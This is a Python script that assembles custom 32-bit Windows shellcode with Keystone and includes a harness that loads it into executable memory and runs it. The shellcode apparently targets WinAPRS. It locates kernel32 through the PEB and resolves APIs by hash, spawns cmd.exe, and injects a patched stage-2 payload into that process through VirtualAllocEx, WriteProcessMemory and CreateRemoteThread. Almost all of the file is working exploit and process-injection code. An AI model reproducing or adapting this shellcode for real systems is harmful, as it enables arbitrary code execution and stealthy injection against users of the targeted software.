import ctypes, struct
from keystone import *

CODE = (
    " start: " #
    
    # ------------------------------------------------------
    # JMP to area of stack where payload is intact
    # ------------------------------------------------------
    "    mov ecx, 0x01bce6f2 ;"             # First copy of shellcode ends up at 0x00bbe5e4
    "    sub ecx, 0x01010101 ;"             # 0x00bbe5f1 will jmp to the first copy of shellcode, just after these JMP instructions
    "    jmp ecx ;"

    # ------------------------------------------------------
    # Adjust stack pointers
    # ------------------------------------------------------
    #"int3;"
    "    add esp, 0xfffffef0 ;"
    "    mov ebp, esp ;"
    "    add esp, 0xfffffef0 ;"             # Avoiding NULL bytes ( sub esp, 0x110) - make room to store args/vars

    # ------------------------------------------------------
    # Build functions to help us find pointers to Kernel32 API methods
    # ------------------------------------------------------
    " find_kernel32: " #
    "    xor ecx, ecx ;"            # ECX = 0
    "    mov esi,fs:[ecx+30h] ;"    # ESI = &(PEB) ([FS:0x30])
    "    mov esi,[esi+0Ch] ;"       # ESI = PEB->Ldr
    "    mov esi,[esi+1Ch] ;"       # ESI = PEB->Ldr.InInitOrder

    " next_module: " #
    "    mov ebx, [esi+8h] ;"       # EBX = InInitOrder[X].base_address
    "    mov edi, [esi+20h] ;"      # EDI = InInitOrder[X].module_name
    "    mov esi, [esi] ;"          # ESI = InInitOrder[X].flink (next)
    "    cmp [edi+12*2], cx ;"      # (unicode) modulename[12] == 0x00?
    "    jne next_module ;"         # No: try next module.

    " find_function_shorten: "              #
    "    jmp find_function_shorten_bnc ;"   # Short jump
    " find_function_ret: "                  #
    "    pop esi ;"                         # POP the return address from the stack
    "    mov [ebp+0x04], esi ;"             # Save find_function address for later usage
    "    jmp resolve_symbols_kernel32 ;"    #
    " find_function_shorten_bnc: "          #
    "    call find_function_ret ;"          # Relative CALL with negative offset to avoid NULL bytes

    " find_function: "              #
    "    pushad ;"                      # Save all registers
                                        # Base address of kernel32 is in EBX from
                                        # Previous step (find_kernel32)
    "    mov eax, [ebx+0x3c] ;"         # Offset to PE Signature
    "    mov edi, [ebx+eax+0x78] ;"     # Export Table Directory RVA
    "    add edi, ebx ;"                # Export Table Directory VMA
    "    mov ecx, [edi+0x18] ;"         # NumberOfNames
    "    mov eax, [edi+0x20] ;"         # AddressOfNames RVA
    "    add eax, ebx ;"                # AddressOfNames VMA
    "    mov [ebp-4], eax ;"            # Save AddressOfNames VMA for later
    " find_function_loop: " #
    "    jecxz find_function_finished ;" # Jump to the end if ECX is 0
    "    dec ecx ;"                      # Decrement our names counter
    "    mov eax, [ebp-4] ;"             # Restore AddressOfNames VMA
    "    mov esi, [eax+ecx*4] ;"         # Get the RVA of the symbol name
    "    add esi, ebx ;"                 # Set ESI to the VMA of the current symbol name
    " compute_hash: " #
    "    mov eax, 0xffffffff ;"         # NULL EAX
    "    inc eax ;"
    "    cdq ;"                         # NULL EDX
    "    cld ;"                         # Clear direction
    " compute_hash_again: " #
    "    lodsb ;"                    # Load the next byte from esi (dll name) into al
    "    push ebx ;"                 # Save base addr of current module
    "    mov bl, al ;"               # Avoid bad char
    "    test al, bl ;"              # Check for NULL terminator
    "    pop ebx ;"                  # restore now
    "    jz compute_hash_finished ;" # If the ZF is set, we've hit the NULL term and end of string, else continue
    "    ror edx, 0x0d ;"            # Rotate edx 13 bits to the right
    "    add edx, eax ;"             # Add the new byte to the accumulator
    "    jmp compute_hash_again ;"   # Next iteration
    " compute_hash_finished: " # Intentionally blank, just a label for the end of the function
    " find_function_compare: " #
    "    cmp edx, [esp+0x24] ;"     # Compare the computed hash with the requested hash
                                    # 0x24 offset must point to pre-computed hash and may change
                                    # depending on how many push/pop instructions are in shellcode
    "    jnz find_function_loop ;"  # If it doesn't match go back to find_function_loop
    "    mov edx, [edi+0x24] ;"     # AddressOfNameOrdinals RVA
    "    add edx, ebx ;"            # AddressOfNameOrdinals VMA
    "    mov cx, [edx+2*ecx] ;"     # Extrapolate the function's ordinal
    "    mov edx, [edi+0x1c] ;"     # AddressOfFunctions RVA
    "    add edx, ebx ;"            # AddressOfFunctions VMA
    "    mov eax, [edx+4*ecx] ;"    # Get the function RVA
    "    add eax, ebx ;"            # Get the function VMA
    "    mov [esp+0x1c], eax ;"     # Overwrite stack version of eax from pushad
    " find_function_finished: " #
    "    popad ;"                   # Restore registers
    "    ret ;" #


    # ------------------------------------------------------
    # Resolve symbols for Kernel32 API methods
    # ------------------------------------------------------
    " resolve_symbols_kernel32: "

    "    push 0x78b5b983 ;"             # TerminateProcess hash
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x10], eax ;"         # Save TerminateProcess address for later usage

    "    push 0x16b3fe72 ;"             # CreateProcessA hash
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x14], eax ;"         # Save address for later usage

    "    push 0x6e1a959c ;"             # VirtualAllocEx hash
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x18], eax ;"         # Save address for later usage

    "    push 0xd83d6aa1 ;"             # WriteProcessMemory hash
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x1c], eax ;"         # Save address for later usage

    "    push 0x72bd9cdd ;"             # CreateRemoteThread hash
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x20], eax ;"         # Save address for later usage

    # -----------------------------------------
    # Create structure areguments for CreateProcess
    # - This is a cmd.exe process that only exists as a place to inject stage 2 shellcode
    # -----------------------------------------
    " create_startupinfoa: " #
    "    xor ecx, ecx ;"
    "    push ecx ;"        # Push hStdError (hStdOutPipeWrite)
    "    push ecx ;"        # Push hStdOutput (hStdOutPipeWrite)
    "    push ecx ;"        # Push hStdInput (hStdInPipeRead)
    "    push ecx ;"        # Push lpReserved2
    "    push ecx ;"        # Push cbReserved2 & wShowWindow
    "    mov al, 0x80 ;"    # Move 0x80 to AL
    "    xor ecx, ecx ;"    # Null ECX
    "    mov cx, 0x0181 ;"
    "    sub cx, 0x0101 ;"  # Get to 0x80 without null bytes
    "    add eax, ecx ;"    # Set EAX to 0x100
    "    push eax ;"        # Push dwFlags
    "    xor ecx, ecx ;"    # Null ECX
    "    push ecx ;"        # Push dwFillAttribute
    "    push ecx ;"        # Push dwYCountChars
    "    push ecx ;"        # Push dwXCountChars
    "    push ecx ;"        # Push dwYSize
    "    push ecx ;"        # Push dwXSize
    "    push ecx ;"        # Push dwY
    "    push ecx ;"        # Push dwX
    "    push ecx ;"        # Push lpTitle
    "    push ecx ;"        # Push lpDesktop
    "    push ecx ;"        # Push lpReserved
    "    mov cl, 0x44 ;"    # Move 0x44 to AL
    "    push ecx ;"        # Push cb
    "    push esp ;"        # Push pointer to the STARTUPINFOAstructure
    "    pop edi ;"         # Store pointer to STARTUPINFOA in EDI
    " create_cmd_string: " #
    "    mov eax, 0xff9a879b ;"     # Move 0xff9a879b into EAX
    "    neg eax ;"                 # Negate EAX, EAX = 00657865
    "    push eax ;"                # Push part of the "cmd.exe" string
    "    push 0x2e646d63 ;"         # Push the remainder of the "cmd.exe" string
    "    push 0x5c343657 ;"
    "    push 0x4f577379 ;"
    "    push 0x535c7377 ;"
    "    push 0x6f646e69 ;"
    "    push 0x575c3a43 ;"
    "    push esp ;"                # Push pointer to the "cmd.exe" string
    "    pop ebx ;"                 # Store pointer to the "cmd.exe" string in EBX
    " call_createprocessa: " #
    "    add esp, 0xfffffff0 ;"
    "    mov eax, esp ;"                # arg: lpProcessInformation
    "    mov [ebp+0x40], eax ;"         # Save pointer to hProcess for later
    "    add esp, 0xfffffff0 ;"
    "    push eax ;"                    # arg: lpProcessInformation
    "    push edi ;"                    # Push lpStartupInfo
    "    mov eax, 0xffffffff ;"         # NULL EAX
    "    inc eax ;"
    "    push eax ;"                    # Push lpCurrentDirectory
    "    push eax ;"                    # Push lpEnvironment
    "    push eax ;"                    # Push dwCreationFlags
    "    inc eax ;"                     # Increase EAX, EAX = 0x01 (TRUE)
    "    push eax ;"                    # Push bInheritHandles
    "    dec eax ;"                     # Null EAX
    "    push eax ;"                    # Push lpThreadAttributes
    "    push eax ;"                    # Push lpProcessAttributes
    "    push eax ;"                    # Push lpCommandLine
    "    push ebx ;"                    # Push lpApplicationName
    #"int3;"
    "    call dword ptr [ebp+0x14] ;"   # Call CreateProcessA

    # ------------------------------------------------------
    # Allocate memory in cmd.exe to write stage 2
    # ------------------------------------------------------
    " call_VirtualAllocEx: "
    "    xor ecx, ecx ;"
    "    add ecx, 0x40 ;"
    "    push ecx ;"                    # arg: flProtect (PAGE_EXECUTE_READWRITE) 0x40
    "    add cx, 0x2fc1 ;"
    "    dec ecx ;"
    "    push ecx ;"                    # arg: flAllocationType (MEM_RESERVE) 0x3000
    "    push ecx ;"                    # arg: dwSize (0x3000 bytes)
    "    xor edx, edx ;"
    "    push edx ;"                    # arg: lpAddress (NULL)
    "    mov ecx, [ebp+0x40] ;"         
    "    mov eax, dword ptr [ecx] ;"    # Recover pointer to hProcess
    "    push eax ;"                    # arg: hProcess (handle to identified process)
    "    call dword ptr [ebp+0x18] ;"   # Call VirtualAllocEx
    "    mov [ebp+0x0c], eax ;"         # save remote address for later

    # ------------------------------------------------------
    # Write stage 2 shellcode in explorer.exe
    # ------------------------------------------------------
   # ------------------------------------------------------
    # Write stage 2 shellcode in explorer.exe
    # ------------------------------------------------------
    #" int3;"
    " call_WriteProcessMemory: "
    "    lea ecx, [ebp+0x08] ; "
    "    push ecx ;"                    # arg: lpNumberOfBytesWritten
    "    xor ecx, ecx ;"
    "    add cx, 0x0fff ;"
    "    push ecx ;"                    # arg: nSize (0x0fff)
    "    jmp get_eip ;"
    " jmp_back: "
    "    pop esi ;"                     # Pop return address (eip) into ESI
    "    jmp WPM_end ;"
    " get_eip:"
    "    call jmp_back ;"
    " WPM_end: "
    "    add esi, 0x6b ;"               # This offset depends on the number of shellcode bytes after this point
    "    push esi ;"                    # arg: lpBuffer (second stage shellcode)
    "    push eax ;"                    # arg: lpBaseAddress
    "    mov ebx, [ebp+0x40] ;"         # Retrieve saved process handle
    "    mov ebx, [ebx] ;"
    "    push ebx ;"                    # arg: hProcess

    # Next functions are used in stage 2 shellcode
    # Need to overwrite placeholder 0xffffffff values in stage 2 with real addresses
    "    mov ebx, 0x76057001 ;"         # CreateFileA import table address (0x00760570)
    "    shr ebx, 0x08 ;"
    "    mov ecx, [ebx] ;"
    "    mov [esi+0x0a], ecx ;"         # Overwrite placeholder in stage 2 shellcode

    "    add ebx, 0x10 ;"               # ReadFile import table addresss (0x00760580)
    "    mov ecx, [ebx] ;"
    "    mov [esi+0x12], ecx ;"         # Overwrite placeholder in stage 2 shellcode

    "    mov ebx, 0x76060801 ;"
    "    shr ebx, 0x08 ;"               # GetCommState import table address (0x00760608)
    "    mov ecx, [ebx] ;"
    "    mov [esi+0x1a], ecx ;"         # Overwrite placeholder in stage 2 shellcode

    "    add ebx, 0x04 ;"               # SetCommState import table address (0x0076060c)
    "    mov ecx, [ebx] ;"
    "    mov [esi+0x22], ecx ;"         # Overwrite placeholder in stage 2 shellcode

    "    mov ebx, 0x76057401 ;"         # CloseHandle import table address (0x00760574)
    "    shr ebx, 0x08 ;"
    "    mov ecx, [ebx] ;"
    "    mov [esi+0x2a], ecx ;"         # Overwrite placeholder in stage 2 shellcode

    "    mov ebx, eax ;"
    "    add bx, 0x1010 ;"              # Offset greater than the length of stage 2 shellcode
    "    mov [esi+0x32], ebx ;"         # Overwrite placeholder in stage 2 shellcode

    "    call dword ptr [ebp+0x1c] ;"   # call WriteProcessMemory

    # ------------------------------------------------------
    # Execute stage 2 shellcode inside cmd.exe
    # ------------------------------------------------------
    " call_CreateRemoteThread: "
    "    xor edx, edx ;"
    "    push edx ;"                    # arg: lpThreadId
    "    push edx ;"                    # arg: dwCreationFlags
    "    push edx ;"                    # arg: lpParameter
    "    mov eax, [ebp+0x0c] ;"         # retrieve remote address
    "    push eax ;"                    # arg: lpStartAddress
    #"    mov ecx, 0x01020101 ;"
    #"    sub ecx, 0x01010101 ;"
    "    push edx ;"                    # arg: dwStackSize 
    "    push edx ;"                    # arg: lpThreadAttributes
    "    mov edx, [ebp+0x40] ;"         # retrieve process handle
    "    mov edx, [edx] ;"
    "    push edx ;"                    # arg: hProcess
    "    call dword ptr [ebp+0x20] ;"   # call CreateRemoteThread

    # ------------------------------------------------------
    # Gracefully terminate WinAPRS
    # ------------------------------------------------------
    " exit: "
    "    xor ecx, ecx ;"
    "    push ecx ;"                    # arg: uExitCode
    "    push 0xffffffff ;"             # arg: hProcess
    "    call dword ptr [ebp+0x10] ;"   # call TerminateProcess

)

# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)

encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)
instructions = ""
for dec in encoding:
    instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")

print(instructions)


sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                            ctypes.c_int(len(shellcode) + 0x1000),
                                            ctypes.c_int(0x3000),
                                            ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                    buf,
                                    ctypes.c_int(len(shellcode)))

print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                        ctypes.c_int(0),
                                        ctypes.c_int(ptr),
                                        ctypes.c_int(0),
                                        ctypes.c_int(0),
                                        ctypes.pointer(ctypes.c_int(0)))
                                        
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))